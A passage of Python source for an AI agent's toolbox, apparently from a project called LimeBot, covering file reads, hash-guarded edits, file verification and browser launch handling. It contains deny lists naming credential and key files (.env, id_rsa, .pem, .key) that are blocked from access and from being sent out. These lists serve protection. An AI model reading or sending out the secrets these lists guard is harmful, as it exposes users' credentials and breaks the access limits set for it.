"""
Toolbox implementation — OS and OS-like capabilities for the agent.
Provides safe, whitelisted, and confirmed interface for file/OS operations.
"""

import asyncio
import ast
import base64
import hashlib
import ipaddress
import json
import mimetypes
import os
import re
import shutil
import socket
import stat
import subprocess
import tempfile
import urllib.parse
import uuid
from decimal import Decimal, DivisionByZero, InvalidOperation, localcontext
from pathlib import Path
from typing import Any, Dict, List, Optional, Union
from loguru import logger
from datetime import datetime

from core.tool_defs import build_tool_definitions
from core.file_edits import EditValidationError, apply_text_edits, unified_text_diff
from core.context import workspace_context
from core.vectors import get_vector_service
from core.paths import LONG_TERM_MEMORY_FILE, MEMORY_DIR, PERSONA_DIR
from core.redaction import redact_sensitive_text
from core.runtime_paths import get_config_file, get_skills_dir

_SENSITIVE_NAMES = frozenset(
    {
        "limebot.json",
        "package-lock.json",
        "config.py",
        "secrets.py",
        ".env",
        ".env.local",
        ".env.production",
    }
)
_SENSITIVE_EXTENSIONS = frozenset({".pem", ".key", ".p12", ".pfx"})
# Max bytes for remote downloads (send_media / fetch_url_to_temp).
_MAX_DOWNLOAD_BYTES = 15 * 1024 * 1024
_MAX_IMAGE_REFERENCE_BYTES = 50 * 1024 * 1024
_MAX_IMAGE_REFERENCES = 4
_DEFAULT_RUN_COMMAND_MAX_SECONDS = 180.0
_IMAGE_REFERENCE_EXTENSIONS = frozenset({".png", ".jpg", ".jpeg", ".webp"})
_DOWNLOAD_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
_OUTBOUND_FORBIDDEN_FILENAMES = frozenset(
    {
        "identity.md",
        "soul.md",
        "memory.md",
        ".env",
        "limebot.json",
        "id_rsa",
        "agents.md",
    }
)
_RG_EXCLUDE_GLOBS = (
    "!.git/**",
    "!node_modules/**",
    "!__pycache__/**",
    "!*.pyc",
    "!.env*",
    "!limebot.json",
    "!config.py",
    "!secrets.py",
    "!package-lock.json",
    "!*.pem",
    "!*.key",
    "!*.p12",
    "!*.pfx",
)


class Toolbox:
    """
    The Toolbox manages the agent's interaction with the external world.
    It provides a safe, whitelisted, and confirmed interface for file/OS operations.
    """

    def __init__(self, allowed_paths: List[str], bus: Any, config: Any):

        self.allowed_paths = [Path.cwd().resolve()]
        self.bus = bus
        self.config = config
        self.agent = None
        self.subagent_registry = None
        self.scheduler = None
        self.channels: List[Any] = []
        self.vector_service = get_vector_service(config)
        # Delivery tools are side effects. Keep a small, turn-scoped ledger so
        # a model cannot resend the same file repeatedly while it is reasoning
        # through one response. Captions are intentionally excluded from the
        # fingerprint because changing narration must not bypass the guard.
        self._sent_media_by_turn: Dict[str, set[str]] = {}

        if allowed_paths:
            for p in allowed_paths:
                try:
                    path = Path(p).resolve()
                    if path not in self.allowed_paths:
                        self.allowed_paths.append(path)
                except Exception as e:
                    logger.warning(f"Could not add allowed path {p}: {e}")

        self.blocked_files = {
            ".env",
            "limebot.json",
            ".git",
            "__pycache__",
            "node_modules",
        }
        try:
            from core.video.service import sweep_expired_jobs

            sweep_expired_jobs()
        except Exception as exc:
            logger.debug(f"Video temp cleanup skipped: {exc}")

    def set_agent(self, agent: Any):
        """Set the agent loop instance."""
        self.agent = agent

    async def analyze_video(
        self,
        source: str,
        question: str = "",
        detail: str = "balanced",
        start: Optional[str] = None,
        end: Optional[str] = None,
        max_frames: Optional[int] = None,
        resolution: int = 512,
    ) -> str:
        """Delegate to the optional native video pipeline."""
        from core.video import analyze_video

        video_config = getattr(self.config, "video", None)
        return await analyze_video(
            source=source,
            question=question,
            detail=detail,
            start=start,
            end=end,
            max_frames=max_frames,
            resolution=resolution,
            is_path_allowed=self._is_path_allowed,
            whisper_enabled=bool(getattr(video_config, "whisper_enabled", False)),
            openai_api_key=os.getenv("OPENAI_API_KEY", "").strip(),
        )

    def set_scheduler(self, scheduler: Any):
        """Set the scheduler instance."""
        self.scheduler = scheduler

    def set_subagent_registry(self, registry: Any):
        """Set the subagent registry used to enrich delegation tools."""
        self.subagent_registry = registry

    def set_channels(self, channels: List[Any]):
        """Expose live channel instances for channel-native tools."""
        self.channels = list(channels or [])

    def _detect_skill_path(self, command: str):
        """Best-effort detection of a skill directory from a command string."""
        match = re.search(r"skills[\\/](?P<name>[^\\/\\s]+)", command)
        if not match:
            return None

        name = match.group("name")
        return {"name": name, "path": Path("skills") / name}

    @staticmethod
    def _preferred_python_executable() -> str:
        """Prefer the project's venv Python when available, then fall back to the running interpreter."""
        import sys as _sys

        candidates = []
        cwd = Path.cwd().resolve()
        if os.name == "nt":
            candidates.extend(
                [
                    cwd / ".venv" / "Scripts" / "python.exe",
                    cwd / "venv" / "Scripts" / "python.exe",
                ]
            )
        else:
            candidates.extend(
                [
                    cwd / ".venv" / "bin" / "python",
                    cwd / "venv" / "bin" / "python",
                ]
            )

        running = Path(_sys.executable).resolve()
        for candidate in candidates:
            try:
                if candidate.exists():
                    return str(candidate)
            except Exception:
                continue
        return str(running)

    @staticmethod
    def _windows_browser_binary(browser_name: str) -> Optional[Path]:
        candidates = {
            "opera": [
                Path.home() / "AppData" / "Local" / "Programs" / "Opera GX" / "opera.exe",
                Path.home() / "AppData" / "Local" / "Programs" / "Opera" / "opera.exe",
            ],
            "msedge": [
                Path(r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
                Path(r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"),
            ],
            "chrome": [
                Path(r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
                Path(r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"),
                Path.home()
                / "AppData"
                / "Local"
                / "Google"
                / "Chrome"
                / "Application"
                / "chrome.exe",
            ],
        }
        for candidate in candidates.get(browser_name, []):
            if candidate.exists():
                return candidate
        return None

    @staticmethod
    def _is_local_port_in_use(port: int) -> bool:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.25)
            return sock.connect_ex(("127.0.0.1", port)) == 0

    @staticmethod
    def _extract_remote_debug_port(command: str) -> Optional[int]:
        match = re.search(
            r"--remote-debugging-port=(\d+)", command or "", re.IGNORECASE
        )
        return int(match.group(1)) if match else None

    @staticmethod
    def _is_windows_process_running(image_name: str) -> bool:
        if os.name != "nt":
            return False
        try:
            result = subprocess.run(
                ["tasklist", "/FI", f"IMAGENAME eq {image_name}", "/FO", "CSV", "/NH"],
                capture_output=True,
                text=True,
                timeout=5,
            )
        except Exception:
            return False
        output = (result.stdout or "").strip().lower()
        return bool(output and "no tasks are running" not in output and image_name.lower() in output)

    def _normalize_browser_launch_command(
        self, command: str
    ) -> tuple[str, Optional[str]]:
        stripped = (command or "").strip()
        lowered = stripped.lower()
        if os.name != "nt" or "--remote-debugging-port=" not in lowered:
            return command, None

        match = re.search(r"--remote-debugging-port=(\d+)", stripped, re.IGNORECASE)
        port = int(match.group(1)) if match else 9222

        browser_name = None
        if re.match(r"^(?:start\s+)?opera(?:\s|$)", lowered):
            browser_name = "opera"
        elif re.match(r"^(?:start\s+)?msedge(?:\s|$)", lowered):
            browser_name = "msedge"
        elif re.match(r"^(?:start\s+)?chrome(?:\s|$)", lowered):
            browser_name = "chrome"

        if not browser_name:
            return command, None

        if self._is_local_port_in_use(port):
            return (
                command,
                f"Error: Port {port} is already in use. Close the browser currently exposing that CDP port or choose a different port before launching {browser_name}.",
            )

        if browser_name == "opera" and "--user-data-dir=" not in lowered:
            if self._is_windows_process_running("opera.exe"):
                return (
                    command,
                    "Error: Opera is already running. Close all Opera windows before launching it with --remote-debugging-port if you want LimeBot to attach to that session.",
                )

        browser_binary = self._windows_browser_binary(browser_name)
        if not browser_binary:
            return (
                command,
                f"Error: Could not find a local {browser_name} binary to launch with remote debugging.",
            )

        normalized = re.sub(
            r"^(?:start\s+)?(?:opera|msedge|chrome)\b",
            lambda _match: f'"{browser_binary}"',
            stripped,
            count=1,
            flags=re.IGNORECASE,
        )
        return normalized, None

    @staticmethod
    def _is_browser_remote_debug_launch(command: str) -> bool:
        lowered = (command or "").lower()
        return "--remote-debugging-port=" in lowered and any(
            token in lowered for token in ("opera.exe", "msedge.exe", "chrome.exe")
        )

    @staticmethod
    def _has_unquoted_semicolon(command: str) -> bool:
        """Return True when a semicolon can act as a shell command separator."""
        in_single = False
        in_double = False
        escaped = False

        for char in command or "":
            if escaped:
                escaped = False
                continue
            if char == "\\":
                escaped = True
                continue
            if char == "'" and not in_double:
                in_single = not in_single
                continue
            if char == '"' and not in_single:
                in_double = not in_double
                continue
            if char == ";" and not in_single and not in_double:
                return True
        return False

    def _long_running_command_hint(self, command: str) -> Optional[str]:
        """Reject commands that start LimeBot itself through the one-shot tool.

        ``main.py`` is the service entrypoint, not a GitHub/skill CLI. Running
        it through `run_command` leaves the tool waiting forever by design.
        The model commonly produces this mistake when a skill documents
        `python main.py ...` without its skill directory prefix.
        """
        tokens = [
            (match.group(1) or match.group(2) or match.group(3) or "").strip()
            for match in re.finditer(
                r'''"([^"]+)"|'([^']+)'|([^\s]+)''', str(command or "")
            )
        ]
        if not tokens:
            return None

        root = self._active_tool_root()
        root_main = (root / "main.py").resolve()
        for index, token in enumerate(tokens):
            if not token.lower().endswith("main.py"):
                continue
            preceding = tokens[:index]
            if not any(
                Path(item).name.lower() in {"python", "python3", "py", "python.exe"}
                or Path(item).name.lower().startswith("python")
                for item in preceding[-3:]
            ):
                continue
            try:
                candidate = Path(token)
                if not candidate.is_absolute():
                    candidate = root / candidate
                if candidate.resolve() != root_main:
                    continue
            except (OSError, ValueError):
                continue
            return (
                "Error: This command starts LimeBot's long-running backend, so "
                "run_command will never finish. Use `limebot start`/`npm start` "
                "to launch the service. For one-shot skill scripts, invoke the "
                "skill entrypoint instead of `main.py`."
            )
        return None

    async def send_progress(self, message: str):
        """Broadcast tool progress if an agent/bus is available."""
        message = redact_sensitive_text(message)
        if self.agent and hasattr(self.agent, "send_tool_progress"):
            from core.context import tool_context

            ctx = tool_context.get()
            if ctx and "tc_id" in ctx:
                await self.agent.send_tool_progress(
                    ctx["tc_id"], ctx.get("chat_id", "system"), message
                )
        logger.info(f"🛠️ Tool Progress: {message}")

    def get_tool_definitions(self) -> List[Dict[str, Any]]:
        """Return the tool definitions based on the current config."""
        enabled_skills = []
        if self.config:
            if hasattr(self.config, "skills") and hasattr(
                self.config.skills, "enabled"
            ):
                enabled_skills = self.config.skills.enabled
            elif isinstance(self.config, dict) and "skills" in self.config:
                enabled_skills = self.config["skills"].get("enabled", [])

        available_agents = {}
        if self.subagent_registry is not None:
            try:
                available_agents = self.subagent_registry.get_agent_descriptions()
            except Exception as e:
                logger.warning(f"Failed to read subagent registry: {e}")

        # Search and browser tools always stay registered; missing Playwright
        # fails at execution with BROWSER_INSTALL_HINT rather than hiding them.
        tools = build_tool_definitions(
            enabled_skills,
            available_agents=available_agents,
            search_available=True,
        )

        # Load MCP tools dynamically
        try:
            from core.mcp_client import get_mcp_manager

            mcp_tools = get_mcp_manager().get_tools()
            for mt in mcp_tools:
                tools.append(mt)
                logger.debug(f"Registered MCP tool: {mt['function']['name']}")
        except Exception as e:
            logger.warning(f"Failed to load MCP tools: {e}")

        return tools

    def _active_workspace_paths(self) -> tuple[Optional[Path], Optional[Path]]:
        context = workspace_context.get() or {}
        if not isinstance(context, dict):
            return None, None
        raw_root = str(context.get("root") or "").strip()
        raw_source_root = str(context.get("source_root") or "").strip()
        if not raw_root or not raw_source_root:
            return None, None
        try:
            root = Path(raw_root).resolve()
            source_root = Path(raw_source_root).resolve()
        except (OSError, ValueError):
            return None, None
        if not root.is_dir() or not source_root.is_dir():
            return None, None
        return root, source_root

    def _resolve_tool_path(
        self, path_str: Union[str, Path], *, for_write: bool = False
    ) -> Path:
        """Resolve a tool path inside the active isolated workspace when present.

        Writes stay in the temporary clone. Reads fall back to the live
        source or other parent-allowed roots so explorer/reviewer can see
        AGENTS.md and allowlisted temp/ instead of inventing a denial.
        """
        raw = Path(path_str).expanduser()
        workspace_root, source_root = self._active_workspace_paths()
        if workspace_root is None or source_root is None:
            return raw.resolve()

        if raw.is_absolute():
            resolved = raw.resolve()
            if resolved == workspace_root or workspace_root in resolved.parents:
                return resolved
            try:
                relative = resolved.relative_to(source_root)
            except ValueError:
                return resolved
            remapped = (workspace_root / relative).resolve()
            if for_write:
                return remapped
            if remapped.exists() or not resolved.exists():
                return remapped
            return resolved

        # A relative argument may still spell a path under the source root
        # (for example ``temp/project/file.py`` when the project root is the
        # process cwd).  Resolve that spelling before falling back to the
        # active clone-relative interpretation.
        try:
            resolved = raw.resolve()
            relative = resolved.relative_to(source_root)
        except (OSError, ValueError):
            relative = None
        if relative is not None:
            remapped = (workspace_root / relative).resolve()
            if for_write:
                return remapped
            if remapped.exists() or not resolved.exists():
                return remapped
            return resolved
        return (workspace_root / raw).resolve()

    def _active_tool_root(self) -> Path:
        workspace_root, _ = self._active_workspace_paths()
        return workspace_root or (self.allowed_paths[0] if self.allowed_paths else Path.cwd())

    def _is_path_allowed(self, path_str: Union[str, Path]) -> bool:
        """Enforce whitelist and block sensitive files."""
        try:
            target_path = self._resolve_tool_path(path_str)
            name = target_path.name.lower()

            if (
                name in _SENSITIVE_NAMES
                or name in self.blocked_files
                or name.startswith(".env")
                or target_path.suffix.lower() in _SENSITIVE_EXTENSIONS
            ):
                return False

            workspace_root, source_root = self._active_workspace_paths()
            if workspace_root is not None:
                if target_path == workspace_root or workspace_root in target_path.parents:
                    return True
                if source_root is not None and (
                    target_path == source_root or source_root in target_path.parents
                ):
                    return True
            for allowed in self.allowed_paths:
                if target_path == allowed or allowed in target_path.parents:
                    return True
            return False
        except Exception:
            return False

    def _to_display_path(self, path: Path) -> str:
        """Prefer project-relative paths in tool responses."""
        try:
            resolved = path.resolve()
            workspace_root, source_root = self._active_workspace_paths()
            if workspace_root is not None and source_root is not None:
                try:
                    resolved = source_root / resolved.relative_to(workspace_root)
                except ValueError:
                    pass
            return str(resolved.relative_to(Path.cwd().resolve()))
        except Exception:
            return str(path.resolve())

    @staticmethod
    def _sha256_file_sync(path: Path) -> str:
        digest = hashlib.sha256()
        with path.open("rb") as handle:
            for chunk in iter(lambda: handle.read(1024 * 1024), b""):
                digest.update(chunk)
        return digest.hexdigest()

    def _is_persona_managed_path(self, path: Path) -> bool:
        try:
            resolved = path.resolve()
            persona_roots = [PERSONA_DIR.resolve()]
            workspace_root, source_root = self._active_workspace_paths()
            if workspace_root is not None and source_root is not None:
                try:
                    persona_roots.append(
                        (
                            workspace_root
                            / PERSONA_DIR.resolve().relative_to(source_root)
                        ).resolve()
                    )
                except ValueError:
                    pass
            return any(
                resolved == persona_root or persona_root in resolved.parents
                for persona_root in persona_roots
            )
        except Exception:
            return False

    @staticmethod
    def _persona_write_error() -> str:
        return (
            "Error: Direct modification of state-managed files under 'persona/' is blocked. "
            "Please use the appropriate XML tags to update your persona, mood, relationship, "
            "memories, or user profiles (e.g., <save_soul>, <save_identity>, <save_mood>, "
            "<save_relationship>, <save_memory>, <log_memory>, or <save_user>)."
        )

    @staticmethod
    def _atomic_write_text_sync(path: Path, content: str) -> None:
        """Atomically replace an existing text file in its own directory."""
        temporary_path: Optional[Path] = None
        try:
            mode = stat.S_IMODE(path.stat().st_mode) if path.exists() else 0o600
            with tempfile.NamedTemporaryFile(
                mode="w",
                encoding="utf-8",
                newline="",
                dir=str(path.parent),
                prefix=f".{path.name}.limebot-",
                suffix=".tmp",
                delete=False,
            ) as handle:
                temporary_path = Path(handle.name)
                handle.write(content)
                handle.flush()
                os.fsync(handle.fileno())
            try:
                os.chmod(temporary_path, mode)
            except OSError:
                logger.debug("Could not preserve permissions for temporary edit file")
            os.replace(temporary_path, path)
            temporary_path = None
        finally:
            if temporary_path is not None:
                try:
                    temporary_path.unlink(missing_ok=True)
                except OSError:
                    pass

    @classmethod
    def _atomic_write_text_if_unchanged_sync(
        cls, path: Path, expected_sha256: str, content: str
    ) -> None:
        """Recheck the target immediately before an atomic replacement."""
        current_sha256 = cls._sha256_file_sync(path)
        if current_sha256 != expected_sha256:
            raise EditValidationError(
                "The file changed while the edit was being prepared; re-read it and retry."
            )
        cls._atomic_write_text_sync(path, content)

    def _format_search_results(self, rows: List[Dict[str, Any]], query: str) -> str:
        if not rows:
            return json.dumps({"query": query, "matches": []})

        formatted_rows = []
        for row in rows:
            path = row.get("path", "unknown")
            line = row.get("line")
            text = (row.get("text") or "").replace("\t", " ").strip()
            if len(text) > 220:
                text = text[:220] + "..."
            formatted_rows.append({"path": path, "line": line, "text": text})

        return json.dumps({"query": query, "matches": formatted_rows})

    @staticmethod
    def _slice_text_for_read(
        text: str,
        max_chars: int,
        start_line: Optional[int] = None,
        end_line: Optional[int] = None,
    ) -> str:
        """Apply optional line slicing + char truncation to extracted text."""
        if start_line is not None or end_line is not None:
            lines = text.splitlines(keepends=True)
            start_idx = max((start_line or 1) - 1, 0)
            end_idx = end_line if end_line is not None else len(lines)
            text = "".join(lines[start_idx:end_idx])

        if len(text) > max_chars:
            return text[:max_chars] + f"\n... (Truncated at {max_chars} chars)"
        return text

    def _get_channel_by_name(self, channel_name: str) -> Any | None:
        for channel in self.channels:
            if getattr(channel, "name", "") == channel_name:
                return channel
        return None

    def _is_path_shareable(self, path_str: Union[str, Path]) -> tuple[bool, str | None, Path | None]:
        """Validate whether a file is safe to send back to a user."""
        if not self._is_path_allowed(path_str):
            return False, f"Access denied to path '{path_str}'.", None

        try:
            p = self._resolve_tool_path(path_str)
        except Exception:
            return False, f"Invalid path '{path_str}'.", None

        if not p.exists():
            return False, f"File '{path_str}' does not exist.", None
        if not p.is_file():
            return False, f"'{path_str}' is not a file.", None

        lowered_name = p.name.lower()
        if lowered_name in _OUTBOUND_FORBIDDEN_FILENAMES or lowered_name.startswith(".env"):
            return False, f"Blocked sensitive file '{p.name}'.", None
        if "persona" in {part.lower() for part in p.parts}:
            return False, "Blocked files inside the persona directory.", None

        return True, None, p

    @staticmethod
    def _extract_docx_text(path: Path) -> str:
        """Extract paragraph and table text from a DOCX file."""
        try:
            from docx import Document
        except Exception as e:
            raise RuntimeError(
                "DOCX support requires 'python-docx'. Install dependencies and retry."
            ) from e

        doc = Document(str(path))
        chunks: List[str] = []

        for paragraph in doc.paragraphs:
            text = paragraph.text.strip()
            if text:
                chunks.append(text)

        for table in doc.tables:
            for row in table.rows:
                cells = [cell.text.strip() for cell in row.cells if cell.text.strip()]
                if cells:
                    chunks.append(" | ".join(cells))

        if chunks:
            return "\n".join(chunks)
        return "No extractable text found in DOCX."

    @staticmethod
    def _extract_pdf_text(path: Path) -> str:
        """Extract text from each page of a PDF."""
        try:
            from pypdf import PdfReader
        except Exception as e:
            raise RuntimeError(
                "PDF support requires 'pypdf'. Install dependencies and retry."
            ) from e

        reader = PdfReader(str(path))
        if reader.is_encrypted:
            try:
                reader.decrypt("")
            except Exception as e:
                raise RuntimeError(
                    "PDF is encrypted and cannot be read without a password."
                ) from e

        chunks: List[str] = []
        for idx, page in enumerate(reader.pages, start=1):
            try:
                page_text = (page.extract_text() or "").strip()
            except Exception as e:
                logger.warning(f"Failed extracting text from PDF page {idx}: {e}")
                continue
            if page_text:
                chunks.append(f"[Page {idx}]\n{page_text}")

        if chunks:
            return "\n\n".join(chunks)
        return "No extractable text found in PDF."

    async def read_file(
        self,
        path: str,
        max_chars: int = 20_000,
        start_line: int = None,
        end_line: int = None,
        include_hash: bool = False,
    ) -> str:
        """
        Read file contents with optional line-range slicing.
        Uses bounded reads to avoid loading huge files into memory.
        """
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = self._resolve_tool_path(path)
        if not p.exists():
            return f"Error: File '{path}' does not exist."
        if not p.is_file():
            return f"Error: '{path}' is a directory."
        try:
            try:
                max_chars = int(max_chars)
            except Exception:
                max_chars = 20_000
            max_chars = max(200, min(max_chars, 200_000))
            include_hash = include_hash is True or (
                isinstance(include_hash, str)
                and include_hash.strip().lower() in {"1", "true", "yes"}
            )
            file_hash = (
                await asyncio.to_thread(self._sha256_file_sync, p)
                if include_hash
                else None
            )

            def _with_metadata(text: str) -> str:
                if not file_hash:
                    return text
                return f"[File SHA-256: {file_hash}]\n{text}"

            has_range = start_line is not None or end_line is not None
            if has_range:
                if start_line is None:
                    start_line = 1
                try:
                    start_line = int(start_line)
                    end_line = int(end_line) if end_line is not None else None
                except Exception:
                    return "Error: start_line/end_line must be integers."

                if start_line < 1:
                    return "Error: start_line must be >= 1."
                if end_line is not None and end_line < start_line:
                    return "Error: end_line must be >= start_line."

            if p.suffix.lower() in {".docx", ".pdf"}:
                def _read_rich_document() -> str:
                    if p.suffix.lower() == ".docx":
                        extracted = Toolbox._extract_docx_text(p)
                    else:
                        extracted = Toolbox._extract_pdf_text(p)
                    return Toolbox._slice_text_for_read(
                        extracted,
                        max_chars=max_chars,
                        start_line=start_line,
                        end_line=end_line,
                    )

                return _with_metadata(await asyncio.to_thread(_read_rich_document))

            if has_range:
                def _read_line_range() -> str:
                    collected: List[str] = []
                    total = 0
                    truncated = False

                    with open(p, "r", encoding="utf-8", errors="replace") as f:
                        for idx, line in enumerate(f, start=1):
                            if idx < start_line:
                                continue
                            if end_line is not None and idx > end_line:
                                break

                            if total + len(line) > max_chars:
                                remaining = max_chars - total
                                if remaining > 0:
                                    collected.append(line[:remaining])
                                truncated = True
                                break

                            collected.append(line)
                            total += len(line)

                    output = "".join(collected)
                    if truncated:
                        output += f"\n... (Truncated at {max_chars} chars)"
                    return output

                return _with_metadata(await asyncio.to_thread(_read_line_range))

            def _read_bounded() -> str:
                with open(p, "r", encoding="utf-8", errors="replace") as f:
                    chunk = f.read(max_chars + 1)
                if len(chunk) > max_chars:
                    return chunk[:max_chars] + f"\n... (Truncated at {max_chars} chars)"
                return chunk

            return _with_metadata(await asyncio.to_thread(_read_bounded))
        except Exception as e:
            return f"Error reading file: {e}"

    async def write_file(self, path: str, content: str) -> str:
        """Write content to a file."""
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."
        p = self._resolve_tool_path(path, for_write=True)
        if self._is_persona_managed_path(p):
            return self._persona_write_error()

        try:
            await asyncio.to_thread(p.parent.mkdir, parents=True, exist_ok=True)
            await asyncio.to_thread(p.write_text, content, encoding="utf-8")
            return f"Successfully wrote to '{path}'."
        except Exception as e:
            return f"Error writing file: {e}"

    async def edit_file(
        self,
        path: str,
        edits: Any,
        expected_sha256: str,
    ) -> str:
        """Apply exact, hash-guarded text edits atomically.

        This is intentionally separate from ``write_file``.  Code edits must
        be anchored to the snapshot the model inspected and must never land
        partially when one requested edit is invalid.
        """
        if not self._is_path_allowed(path):
            return f"Error: Access denied to path '{path}'."

        target = self._resolve_tool_path(path, for_write=True)
        if self._is_persona_managed_path(target):
            return self._persona_write_error()
        if not target.exists():
            return f"Error: File '{path}' does not exist; use write_file to create it."
        if not target.is_file():
            return f"Error: '{path}' is not a file."

        expected = str(expected_sha256 or "").strip().lower()
        if not re.fullmatch(r"[0-9a-f]{64}", expected):
            return (
                "Error: edit_file requires expected_sha256 from "
                "read_file(include_hash=true)."
            )

        try:
            size = target.stat().st_size
            if size > 5 * 1024 * 1024:
                return "Error: edit_file only accepts text files up to 5 MiB."

            original_bytes = await asyncio.to_thread(target.read_bytes)
            current_sha256 = hashlib.sha256(original_bytes).hexdigest()
            original = original_bytes.decode("utf-8")
            if current_sha256 != expected:
                from core.file_edits import intended_edits_already_present

                if intended_edits_already_present(original, edits):
                    return json.dumps(
                        {
                            "status": "already_applied",
                            "path": self._to_display_path(target),
                            "replacements": 0,
                            "sha256_before": current_sha256,
                            "sha256_after": current_sha256,
                            "detail": (
                                "Skipped stale edit; the intended text is "
                                "already on disk."
                            ),
                        },
                        ensure_ascii=False,
                    )
                return (
                    "Error: Stale edit rejected. The file's SHA-256 is "
                    f"{current_sha256}, not {expected}; re-read the file and retry."
                )
        except UnicodeDecodeError:
            return "Error: edit_file only supports UTF-8 text files."
        except OSError as exc:
            return f"Error reading file for edit: {exc}"

        try:
            updated, replacement_count = apply_text_edits(original, edits)
        except EditValidationError as exc:
            from core.file_edits import intended_edits_already_present

            if intended_edits_already_present(original, edits):
                current_sha256 = hashlib.sha256(original.encode("utf-8")).hexdigest()
                return json.dumps(
                    {
                        "status": "already_applied",
                        "path": self._to_display_path(target),
                        "replacements": 0,
                        "sha256_before": current_sha256,
                        "sha256_after": current_sha256,
                        "detail": (
                            "Skipped unusable edit; the intended text is "
                            "already on disk."
                        ),
                    },
                    ensure_ascii=False,
                )
            return f"Error: Edit rejected: {exc}"

        if replacement_count == 0 or updated == original:
            current_sha256 = hashlib.sha256(original.encode("utf-8")).hexdigest()
            return json.dumps(
                {
                    "status": "already_applied",
                    "path": self._to_display_path(target),
                    "replacements": 0,
                    "sha256_before": current_sha256,
                    "sha256_after": current_sha256,
                    "detail": "No file change; intended text is already on disk.",
                },
                ensure_ascii=False,
            )

        diff = unified_text_diff(
            original,
            updated,
            fromfile=f"{self._to_display_path(target)} (before)",
            tofile=f"{self._to_display_path(target)} (after)",
        )
        try:
            await asyncio.to_thread(
                self._atomic_write_text_if_unchanged_sync,
                target,
                expected,
                updated,
            )
        except EditValidationError as exc:
            return f"Error: Edit rejected: {exc}"
        except OSError as exc:
            return f"Error writing file edit: {exc}"

        after_sha256 = hashlib.sha256(updated.encode("utf-8")).hexdigest()
        diff_lines = diff.splitlines()
        added_lines = sum(
            1
            for line in diff_lines
            if line.startswith("+") and not line.startswith("+++")
        )
        removed_lines = sum(
            1
            for line in diff_lines
            if line.startswith("-") and not line.startswith("---")
        )
        verification_raw = await self.verify_files([str(target)])
        try:
            verification: Any = json.loads(verification_raw)
        except (TypeError, json.JSONDecodeError):
            verification = {"status": "unavailable", "detail": verification_raw}
        return json.dumps(
            {
                "status": "applied",
                "path": self._to_display_path(target),
                "replacements": replacement_count,
                "added_lines": added_lines,
                "removed_lines": removed_lines,
                "sha256_before": expected,
                "sha256_after": after_sha256,
                "diff": diff,
                "verification": verification,
            },
            ensure_ascii=False,
        )

    @staticmethod
    def _verify_text_syntax(path: Path, text: str) -> Dict[str, Any]:
        suffix = path.suffix.lower()
        try:
            if suffix in {".py", ".pyi"}:
                compile(text, str(path), "exec")
                return {"name": "python_syntax", "status": "passed"}
            if suffix == ".json":
                json.loads(text)
                return {"name": "json_syntax", "status": "passed"}
            if suffix == ".toml":
                try:
                    import tomllib
                except ImportError:
                    return {"name": "toml_syntax", "status": "skipped"}
                tomllib.loads(text)
                return {"name": "toml_syntax", "status": "passed"}
        except SyntaxError as exc:
            line = f" line {exc.lineno}" if exc.lineno else ""
            return {
                "name": f"{suffix.lstrip('.') or 'text'}_syntax",
                "status": "failed",
                "detail": f"{exc.msg}{line}",
            }
        except (ValueError, TypeError) as exc:
            return {
                "name": f"{suffix.lstrip('.') or 'text'}_syntax",
                "status": "failed",
                "detail": str(exc),
            }
        return {"name": "syntax", "status": "skipped"}

    @staticmethod
    def _verify_git_diff_check_sync(path: Path) -> Dict[str, Any]:
        root = Path.cwd().resolve()
        try:
            relative = path.resolve().relative_to(root)
        except ValueError:
            return {
                "name": "git_diff_check",
                "status": "skipped",
                "detail": "target is outside the project root",
            }

        try:
            completed = subprocess.run(
                ["git", "diff", "--check", "--", str(relative)],
                cwd=str(root),
                capture_output=True,
                text=True,
                timeout=10,
                check=False,
            )
        except (OSError, subprocess.SubprocessError) as exc:
            return {
                "name": "git_diff_check",
                "status": "skipped",
                "detail": f"git diff check unavailable: {exc}",
            }

        if completed.returncode == 0:
            return {"name": "git_diff_check", "status": "passed"}
        detail = (completed.stdout or completed.stderr or "git diff --check failed").strip()
        return {
            "name": "git_diff_check",
            "status": "failed",
            "detail": redact_sensitive_text(detail[:1_200]),
        }

    async def verify_files(
        self,
        paths: List[str],
        include_diagnostics: bool = False,
        provider: str = "auto",
    ) -> str:
        """Run bounded, read-only checks for changed files."""
        if not isinstance(paths, list) or not paths:
            return "Error: verify_files requires a non-empty paths array."
        if len(paths) > 32:
            return "Error: verify_files accepts at most 32 paths."

        file_results: List[Dict[str, Any]] = []
        for raw_path in paths:
            display_input = str(raw_path or "")
            if not self._is_path_allowed(display_input):
                file_results.append(
                    {
                        "path": display_input,
                        "status": "failed",
                        "errors": ["access denied"],
                    }
                )
                continue
            target = self._resolve_tool_path(display_input)
            if not target.exists() or not target.is_file():
                file_results.append(
                    {
                        "path": self._to_display_path(target),
                        "status": "failed",
                        "errors": ["file does not exist or is not a regular file"],
                    }
                )
                continue

            try:
                if target.stat().st_size > 5 * 1024 * 1024:
                    raise ValueError("file exceeds the 5 MiB verification limit")
                raw_bytes = await asyncio.to_thread(target.read_bytes)
                text = raw_bytes.decode("utf-8")
            except UnicodeDecodeError:
                file_results.append(
                    {
                        "path": self._to_display_path(target),
                        "status": "failed",
                        "errors": ["file is not valid UTF-8 text"],
                    }
                )
                continue
            except (OSError, ValueError) as exc:
                file_results.append(
                    {
                        "path": self._to_display_path(target),
                        "status": "failed",
                        "errors": [str(exc)],
                    }
                )
                continue

            checks: List[Dict[str, Any]] = []
            marker_lines = [
                index
                for index, line in enumerate(text.splitlines(), start=1)
                if re.match(r"^\s*(?:<<<<<<<|=======|>>>>>>>)", line)
            ]
            if marker_lines:
                checks.append(
                    {
                        "name": "conflict_markers",
                        "status": "failed",
                        "detail": f"marker(s) at line(s) {', '.join(map(str, marker_lines[:8]))}",
                    }
                )
            else:
                checks.append({"name": "conflict_markers", "status": "passed"})
            checks.append(self._verify_text_syntax(target, text))
            checks.append(
                await asyncio.to_thread(self._verify_git_diff_check_sync, target)
            )
            failures = [check for check in checks if check.get("status") == "failed"]
            file_results.append(
                {
                    "path": self._to_display_path(target),
